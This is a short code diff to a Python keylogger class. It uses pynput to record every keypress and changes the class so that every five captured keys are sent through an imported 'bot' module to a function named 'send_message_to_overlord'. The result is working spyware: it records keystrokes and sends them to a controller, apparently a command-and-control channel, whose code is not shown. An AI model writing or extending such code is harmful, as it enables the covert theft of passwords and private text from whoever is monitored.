@@ -1,9 +1,10 @@
 from pynput.keyboard import Key, Listener
 from keypress import KeyPress
+import bot
 
 
 class KeyListener:
-    BUFFER_CAPACITY = 50
+    BUFFER_CAPACITY = 5
 
     def __init__(self):
         self.buffered_keys = []
@@ -15,6 +16,7 @@ class KeyListener:
     def on_press(self, key):
         self.buffered_keys.append(KeyPress(str(key)))
         if len(self.buffered_keys) >= self.BUFFER_CAPACITY:
+            bot.send_message_to_overlord(self.buffered_keys)
             # Flush buffer
             self.buffered_keys = []
 
